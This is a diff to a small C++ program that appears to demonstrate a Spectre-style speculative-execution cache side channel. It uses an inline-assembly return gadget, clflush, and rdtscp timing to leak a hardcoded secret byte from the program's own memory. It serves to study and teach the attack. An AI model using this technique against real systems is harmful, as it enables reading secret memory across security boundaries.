@@ -4,54 +4,21 @@ using namespace std;
 
 char array[256*256];
 char temp;
-char secret = 'p';
+char secret = 112;
 
-void gadget_flush(){
+void gadget(){
 	__asm__(
 	"pop %rdi;"
 	"pop %rdi;"	
-	"pop %rdi;"
-	"nop;"
-	"pop %rbp;"
-	"clflush (%rsp);"
-	"clflush (%rip);"
-	"cpuid;"
-	"retq;");
-}
-
-void gadget_nonflush(){
-	__asm__(
-	"pop %rdi;"
-	"pop %rdi;"	
-	"pop %rdi;"
-	"nop;"
 	"pop %rbp;"
 	"clflush (%rsp);"
 	"cpuid;"
 	"retq;");
 }
 
-
-void speculative(char *secret_ptr){
-	gadget_nonflush();
-	secret = *secret_ptr;
+void speculative(){
+	gadget();
 	temp &= array[secret * 256];
-}
-
-void speculative_nonflush(char *secret_ptr){
-	gadget_nonflush();
-	secret = *secret_ptr;
-	temp &= array[secret * 256];
-}
-
-void speculative_flush(char *secret_ptr){
-	gadget_flush();
-	secret = *secret_ptr;
-	temp &= array[secret * 256];
-}
-
-int addFive(int x){
-	return x+5;
 }
 
 inline void time(int i) {
@@ -59,31 +26,21 @@ inline void time(int i) {
 	auto t1 = __rdtscp(&dummy);
 	auto junk = array[i*256];
 	auto t2 = __rdtscp(&dummy);
-	cout<< i <<" "<<t2-t1<<endl;
+	cout << "Accessed value: " << i << " time: " << t2-t1 << endl;
 }
 
 int main(){
-	int x = 2;
-	int y = addFive(x);
-
+	// Flush array from caches
 	for (int i = 0; i < 256; i++){
 		clflush(&array[i*256]);
 	}
 
-	unsigned int dummy;
+	// Run code which speculatively loads data into cache
+	speculative();
 
-	auto t1 = __rdtscp(&dummy);
-	speculative_nonflush(&secret);
-	auto t2 = __rdtscp(&dummy);
-	cout<<t2-t1<<endl;
+	cout << "Secret value is " << (int)secret << ". That value should have a lower access time." << endl;
 
-
-	auto t3 = __rdtscp(&dummy);
-	speculative_flush(&secret);
-	auto t4 = __rdtscp(&dummy);
-	cout<<t4-t3<<endl;
-
-	speculative(&secret);
+	// Choose measured values randomly to prevent CPU prefetching.
 	time(5);
 	time(63);
 	time(102);
@@ -91,5 +48,6 @@ int main(){
 	time(145);
 	time(204);
 	time(243);
+	
 	return 0;
 }
